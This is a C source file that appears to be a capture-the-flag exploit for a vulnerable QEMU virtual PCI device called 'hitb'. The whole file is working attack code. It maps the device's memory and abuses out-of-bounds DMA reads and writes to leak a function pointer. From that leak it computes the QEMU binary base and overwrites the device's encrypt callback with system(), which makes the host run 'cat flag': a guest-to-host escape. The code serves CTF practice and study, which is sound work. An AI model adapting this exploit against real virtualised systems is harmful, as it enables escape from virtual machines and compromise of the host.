#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>

#define PAGE_SHIFT 12
#define DMA_BASE 0x40000

uint8_t *iomem;
uint8_t *dmabuf;
uint64_t dmabuf_phys_addr;

void die(const char *msg)
{
    perror(msg);
    exit(-1);
}

uint64_t virt2phys(void *p)
{
    uint64_t virt = (uint64_t)p;
    assert((virt&0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1) {
        die("open2");
    }

    uint64_t offset = virt >> (PAGE_SHIFT-3);
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8) != 8) {
        die("read");
    }

    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) << PAGE_SHIFT;
    return phys;
}

void iowrite(uint64_t addr, uint64_t value)
{
    *((uint64_t *)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr)
{
    return *((uint64_t *)(iomem + addr));
}

void dma_setsrc(uint32_t src)
{
    iowrite(0x80, src);
}

void dma_setdst(uint32_t dst)
{
    iowrite(0x88, dst);
}

void dma_setcnt(uint32_t cnt)
{
    iowrite(0x90, cnt);
}

void dma_setcmd(uint32_t cmd)
{
    iowrite(0x98, cmd);
}

void dma_read(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);
    dma_setcmd(0x3);
    sleep(1);
}

void dma_write(uint64_t addr, void *buf, size_t len)
{
    memcpy(dmabuf, buf, len);

    dma_setsrc(dmabuf_phys_addr);
    dma_setdst(addr);
    dma_setcnt(len);
    dma_setcmd(0x1);
    sleep(1);
}

void dma_enc_read(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);
    dma_setcmd(0x7);
    sleep(1);
}

int main(int argc, char *argv[])
{
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR|O_SYNC);
    if (fd == -1) {
        die("open");
    }

    iomem = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED) {
        die("mmap");
    }
    printf("iomem          @ %p\n", iomem);

    dmabuf = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED) {
        die("mmap2");
    }

    // lock part or all of the calling process's virtual address space
    // into RAM, preventing that memory from being paged to the swap area.
    mlock(dmabuf, 0x1000);
    dmabuf_phys_addr = virt2phys(dmabuf);
    printf("dmabuff        @ %p\n", dmabuf);
    printf("dmabuff(phys)  @ %p\n", (void *)dmabuf_phys_addr);
    fflush(stdout);

    // leak hitb_enc address
    dma_read(DMA_BASE+0x1000, 8);
    uint64_t hitb_enc = *((uint64_t *)dmabuf);

    // calculate the system plt.got address
    uint64_t elf_base      = hitb_enc - 0x283DD0;
    uint64_t system_pltgot = elf_base + 0x1FDB18;
    printf("system@plt.got @ 0x%lx\n", system_pltgot);

    dma_write(DMA_BASE+0x1000, &system_pltgot, 8);
    char *payload = "cat flag";
    dma_write(DMA_BASE+0x100, payload, strlen(payload));

    dma_enc_read(DMA_BASE+0x100, 0x4);
    return 0;
}